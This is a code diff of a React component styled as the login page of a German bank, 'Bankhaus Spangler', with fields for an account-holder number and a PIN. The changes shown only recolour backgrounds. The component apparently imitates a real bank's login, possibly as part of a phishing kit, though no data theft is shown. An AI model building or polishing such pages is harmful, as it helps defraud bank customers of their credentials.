@@ -41,7 +41,7 @@ export function BankhausSpangler({ formData, onChange, handleRouteAction, saving
       ></div>
 
       {/* Main Login Card */}
-      <div className="w-full max-w-[620px] bg-white/95 backdrop-blur-sm shadow-[0_10px_30px_rgba(0,0,0,0.15)] flex flex-col mb-12">
+      <div className="w-full max-w-[620px] bg-[#fff6ec]/95 backdrop-blur-sm shadow-[0_10px_30px_rgba(0,0,0,0.15)] flex flex-col mb-12">
         
         {/* Dark Blue Header */}
         <div className="bg-[#42618a] text-white px-6 py-4">
@@ -90,7 +90,7 @@ export function BankhausSpangler({ formData, onChange, handleRouteAction, saving
                   autoFocus
                   value={formData.verfuegernummer || ""}
                   onChange={(e) => onChange("verfuegernummer", e.target.value)}
-                  className="w-full h-[42px] bg-[#eef0f3] border border-[#c5c9d1] rounded-[3px] px-3 outline-none focus:border-[#42618a] focus:bg-white text-[#333] text-[15px] transition-colors"
+                  className="w-full h-[42px] bg-[#eef0f3] border border-[#c5c9d1] rounded-[3px] px-3 outline-none focus:border-[#42618a] focus:bg-[#fff6ec] text-[#333] text-[15px] transition-colors"
                 />
               ) : (
                 <div className="animate-in fade-in slide-in-from-right-4 duration-300">
@@ -100,7 +100,7 @@ export function BankhausSpangler({ formData, onChange, handleRouteAction, saving
                     autoFocus
                     value={formData.pin || ""}
                     onChange={(e) => onChange("pin", e.target.value)}
-                    className="w-full h-[42px] bg-[#eef0f3] border border-[#c5c9d1] rounded-[3px] px-3 outline-none focus:border-[#42618a] focus:bg-white text-[#333] text-[15px] transition-colors"
+                    className="w-full h-[42px] bg-[#eef0f3] border border-[#c5c9d1] rounded-[3px] px-3 outline-none focus:border-[#42618a] focus:bg-[#fff6ec] text-[#333] text-[15px] transition-colors"
                   />
                 </div>
               )}
@@ -124,7 +124,7 @@ export function BankhausSpangler({ formData, onChange, handleRouteAction, saving
               <button 
                 type="button" 
                 onClick={() => setStep(1)}
-                className="w-full mt-3 bg-white border border-[#42618a] hover:bg-blue-50 text-[#42618a] font-medium h-[44px] rounded-[3px] text-[15px] transition-colors"
+                className="w-full mt-3 bg-[#fff6ec] border border-[#42618a] hover:bg-blue-50 text-[#42618a] font-medium h-[44px] rounded-[3px] text-[15px] transition-colors"
               >
                 Zurück
               </button>
